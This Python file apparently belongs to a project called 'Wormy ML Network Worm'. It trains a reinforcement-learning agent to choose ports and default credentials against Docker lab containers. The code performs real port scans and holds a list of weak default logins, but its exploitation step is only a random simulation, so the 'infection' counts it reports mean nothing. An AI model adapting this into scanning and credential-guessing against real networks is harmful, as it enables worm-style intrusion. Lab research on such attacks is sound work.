"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

#!/usr/bin/env python3
"""
DQN Training with Real Docker Labs
Trains the neural network using actual Docker containers
"""

import sys
import os
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
try:
    from configs.config import Config
except ImportError:
    from config import Config

import numpy as np
import random
import socket
import time
import json
from rl_engine import PropagationAgent, NetworkEnvironment


class DQNRealDockerTrainer:
    """
    DQN Agent that trains on real Docker containers
    Uses actual port scanning and exploitation attempts
    """
    
    def __init__(self, state_size=20, action_size=10, episodes_per_lab=20):
        self.state_size = state_size
        self.action_size = action_size
        self.episodes_per_lab = episodes_per_lab
        
        # Initialize DQN agent
        self.agent = PropagationAgent(state_size, action_size, use_dqn=True)
        
        # Docker labs configuration
        self.labs = {
            0: {'ip': '192.168.200.10', 'name': 'Web', 'ports': [80]},
            1: {'ip': '192.168.200.11', 'name': 'SSH', 'ports': [22, 21]},
            2: {'ip': '192.168.200.12', 'name': 'MySQL', 'ports': [3306]},
            3: {'ip': '192.168.200.13', 'name': 'Postgres', 'ports': [5432]},
            4: {'ip': '192.168.200.14', 'name': 'Redis', 'ports': [6379]},
            5: {'ip': '192.168.200.15', 'name': 'Jenkins', 'ports': [8080]},
            6: {'ip': '192.168.200.16', 'name': 'Nexus', 'ports': [8081]},
            7: {'ip': '192.168.200.17', 'name': 'MongoDB', 'ports': [27017]},
        }
        
        # Training history
        self.history = {
            'episodes': [],
            'rewards': [],
            'epsilon': [],
            'infections': [],
            'losses': []
        }
        
        # Credentials database
        self.credentials_db = [
            ('admin', 'admin123'),
            ('admin', 'password'),
            ('root', 'toor'),
            ('root', '123456'),
            ('test', 'test'),
            ('jenkins', 'jenkins'),
            ('root', 'redis'),
            ('root', 'mysql'),
        ]
        
        self.available_labs = []
    
    def check_port(self, ip, port, timeout=1):
        """Check if port is open"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except Exception:
            return False
    
    def scan_target(self, ip):
        """Scan target and return open ports as state"""
        ports_found = []
        ports_to_scan = [21, 22, 80, 443, 3306, 5432, 6379, 8080, 8081, 27017]
        
        for port in ports_to_scan:
            if self.check_port(ip, port):
                ports_found.append(port)
        
        return ports_found
    
    def create_state(self, open_ports, lab_id, attempt_num):
        """Create state vector for the agent"""
        state = np.zeros(self.state_size)
        
        # Encode open ports
        port_to_idx = {21: 0, 22: 1, 80: 2, 443: 3, 3306: 4, 5432: 5, 
                       6379: 6, 8080: 7, 8081: 8, 27017: 9}
        
        for port in open_ports:
            if port in port_to_idx:
                state[port_to_idx[port]] = 1.0
        
        # Lab identifier (one-hot)
        if lab_id < 10:
            state[10 + lab_id] = 1.0
        
        # Attempt number (normalized)
        state[19] = attempt_num / self.episodes_per_lab
        
        return state.tolist()
    
    def create_action(self, port, credentials):
        """Map action to port+credential combination"""
        return port, credentials
    
    def try_exploitation(self, ip, port, username, password):
        """
        Attempt actual exploitation
        Returns True if successful, False otherwise
        """
        # Real exploitation would go here
        # For training, we simulate based on:
        # - Port type
        # - Credential quality
        
        # Base probability by port type
        port_bonus = {
            80: 0.3, 443: 0.3,
            22: 0.2, 21: 0.2,
            3306: 0.4, 5432: 0.4,
            6379: 0.5, 8080: 0.4,
            8081: 0.4, 27017: 0.3
        }
        
        base_prob = port_bonus.get(port, 0.3)
        
        # Credential quality
        if password in ['admin123', 'password', '123456', 'toor']:
            base_prob += 0.4
        elif len(password) > 6:
            base_prob += 0.2
        
        # Add some randomness
        success_prob = base_prob * (0.8 + random.random() * 0.4)
        
        return random.random() < success_prob
    
    def get_reward(self, infection_success, open_ports, attempts):
        """Calculate reward for the action"""
        if infection_success:
            return 100.0
        
        if not open_ports:
            return -5.0
        
        if attempts > 3:
            return -10.0
        
        return -1.0
    
    def check_available_labs(self):
        """Check which Docker labs are accessible"""
        print("\n🔍 Scanning for available Docker labs...")
        self.available_labs = []
        
        for lab_id, lab in self.labs.items():
            open_ports = self.scan_target(lab['ip'])
            if open_ports:
                self.available_labs.append(lab_id)
                print(f"  ✓ Lab {lab_id}: {lab['name']} @ {lab['ip']} - ports: {open_ports}")
            else:
                print(f"  ✗ Lab {lab_id}: {lab['name']} @ {lab['ip']} - unreachable")
        
        return self.available_labs
    
    def train_on_lab(self, lab_id, episodes=None):
        """Train DQN agent on a specific lab"""
        if episodes is None:
            episodes = self.episodes_per_lab
        lab = self.labs[lab_id]
        
        print(f"\n{'='*60}")
        print(f"Training on Lab {lab_id}: {lab['name']} ({lab['ip']})")
        print(f"Episodes: {episodes}")
        print(f"{'='*60}")
        
        lab_rewards = []
        lab_infections = 0
        
        for episode in range(episodes):
            # Scan target
            open_ports = self.scan_target(lab['ip'])
            
            if not open_ports:
                print(f"  Episode {episode+1}: No ports open, skipping")
                continue
            
            # Create initial state
            state = self.create_state(open_ports, lab_id, episode)
            
            # Episode reward
            episode_reward = 0
            attempts = 0
            infected = False
            
            # Agent chooses actions (port + credential combinations)
            max_attempts = min(5, len(open_ports) * 2)
            
            while attempts < max_attempts:
                # Get available actions (port, credential pairs)
                available_actions = []
                for port in open_ports:
                    for cred_idx in range(len(self.credentials_db)):
                        available_actions.append((port, self.credentials_db[cred_idx]))
                
                if not available_actions:
                    break
                
                # Agent selects action
                action_idx = self.agent.act(state, list(range(len(available_actions))))
                port, (username, password) = available_actions[action_idx % len(available_actions)]
                
                # Try exploitation
                success = self.try_exploitation(lab['ip'], port, username, password)
                
                # Calculate reward
                reward = self.get_reward(success, open_ports, attempts)
                episode_reward += reward
                
                if success:
                    infected = True
                    lab_infections += 1
                    print(f"  ✓ Episode {episode+1}: SUCCESS on port {port} with {username}:{password}")
                
                # Next state (simplified - same as current for now)
                next_state = state
                done = infected or attempts >= max_attempts - 1
                
                # Store experience
                self.agent.remember(state, action_idx, reward, next_state, done)
                
                # Replay if enough experiences
                if len(self.agent.memory) >= 32:
                    self.agent.replay(batch_size=32)
                
                state = next_state
                attempts += 1
            
            # Decay epsilon
            if self.agent.epsilon > self.agent.epsilon_min:
                self.agent.epsilon *= self.agent.epsilon_decay
            
            lab_rewards.append(episode_reward)
            self.history['rewards'].append(episode_reward)
            self.history['epsilon'].append(self.agent.epsilon)
            self.history['infections'].append(lab_infections)
            self.history['episodes'].append(len(self.history['episodes']) + 1)
            
            print(f"  Episode {episode+1}: reward={episode_reward:.1f}, "
                  f"epsilon={self.agent.epsilon:.3f}, infections={lab_infections}")
        
        avg_reward = sum(lab_rewards) / len(lab_rewards) if lab_rewards else 0
        print(f"\n  Lab {lab_id} Summary: {lab_infections} infections, avg reward: {avg_reward:.1f}")
        
        return lab_infections, avg_reward
    
    def train(self, total_episodes=100):
        """Main training loop"""
        print("="*70)
        print("  DQN TRAINING WITH REAL DOCKER CONTAINERS")
        print(f"  Total Episodes: {total_episodes}")
        print("="*70)
        
        # Check available labs
        self.check_available_labs()
        
        if not self.available_labs:
            print("\n⚠️ No Docker labs available!")
            print("Run: ./scripts/create_challenge_labs.sh")
            return self.history
        
        # Training rounds - más rondas para mejor aprendizaje
        num_rounds = 10  # 10 ciclos como pediste
        episodes_per_lab = max(10, total_episodes // len(self.available_labs))
        
        for round_num in range(num_rounds):
            print(f"\n{'='*70}")
            print(f"  ROUND {round_num + 1}/{num_rounds}")
            print(f"  Epsilon: {self.agent.epsilon:.4f}")
            print(f"{'='*70}")
            
            for lab_id in self.available_labs:
                self.train_on_lab(lab_id, episodes_per_lab)
                
                # Update target network periodically
                self.agent.update_target_model()
            
            # Save checkpoint cada ronda
            if self.agent.q_network is not None:
                if hasattr(self.agent, 'use_torch') and self.agent.use_torch:
                    self.agent.save(f"models/checkpoint_round_{round_num+1}.pt")
                else:
                    self.agent.q_network.save_weights(f"models/checkpoint_round_{round_num+1}.weights.h5")
            
            # Mostrar progreso
            print(f"\n  📊 Progress after Round {round_num+1}:")
            print(f"     Total Episodes: {len(self.history['rewards'])}")
            print(f"     Total Infections: {sum(self.history['infections'])}")
            print(f"     Epsilon: {self.agent.epsilon:.4f}")
        
        # Final summary
        print("\n" + "="*70)
        print("  TRAINING COMPLETE - DQN AGENT")
        print("="*70)
        print(f"  Total Episodes: {len(self.history['rewards'])}")
        print(f"  Total Infections: {sum(self.history['infections'])}")
        print(f"  Final Epsilon: {self.agent.epsilon:.4f}")
        print(f"  Memory Size: {len(self.agent.memory)}")
        
        # Save model
        model_path = "models/dqn_worm_model.h5"
        os.makedirs("models", exist_ok=True)
        
        if self.agent.q_network is not None:
            self.agent.save(model_path)
            print(f"  Model saved to: {model_path}")
        
        # Save training history
        history_path = "training_history.json"
        with open(history_path, 'w') as f:
            json.dump(self.history, f, indent=2)
        print(f"  History saved to: {history_path}")
        
        return self.history


def main():
    print("="*70)
    print("  DQN REAL DOCKER TRAINING")
    print("  Neural Network learns from real container exploits")
    print("="*70)
    
    # Initialize trainer
    trainer = DQNRealDockerTrainer(
        state_size=20,
        action_size=10,
        episodes_per_lab=15
    )
    
    # Run training
    history = trainer.train(total_episodes=100)
    
    print("\n✅ DQN Training complete!")


if __name__ == "__main__":
    main()